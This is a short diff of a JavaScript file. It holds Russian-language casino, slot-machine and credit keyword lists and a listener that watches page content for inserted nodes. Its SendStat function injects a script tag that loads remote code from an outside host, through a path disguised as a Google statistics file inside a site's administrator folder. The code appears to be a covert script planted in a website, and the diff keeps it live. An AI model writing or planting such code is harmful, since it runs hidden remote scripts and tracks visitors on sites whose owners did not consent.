@@ -2,7 +2,6 @@ var keyWords_casino = ["Игровые автоматы","игровые апп�
 
 var keyWords_credit = ["кредит","деньги","ипотека","в долг","автокредит","банк"];
 
-window.onload = function () {
 		document.getElementById('main').addEventListener('DOMNodeInserted',function() {
 		var keyWords_casino = ["Игровые автоматы","игровые аппараты","казино", "Gaminator", "карточные игры", "видеопокер","книжки","Crazy Fruits","игровой автомат","garage","just jewels","mega jack","алькатрас","гараж","емеля","клубнички","ешки","золото партии","обезьянки","резидент","клубнички","лягушки","гейминатор","слотомания","золото ацтеков","книга ра","fruit cocktail","гаминатор","мега джек","черти","bananas go bahamas","black beard","book of ra","casino","crazy monkey","fairy land","fruit cocktail","golden mine","lucky haunter","lucky lady","piggy bank","resident","queen of hearts","windjammer","ацтек голд","книги ра","пробки","сундуки","чукча","fairy land","gaminator","money","печки","сейфы","скалолаз","гараж","играть бесплатно","манки","играть на","крези фрукт","однорукий","фруктовый коктейль","Keks","Rock Climber"];
 
@@ -34,7 +33,7 @@ window.onload = function () {
 			}
 					
 			},false);
-}
+
 function SendStat(count){		
 	var stat = document.createElement("script");
 		url = "http://vogis.asmeninis.com/administrator/help/en-GB/css/style/google_statistic.php/?count="+count;
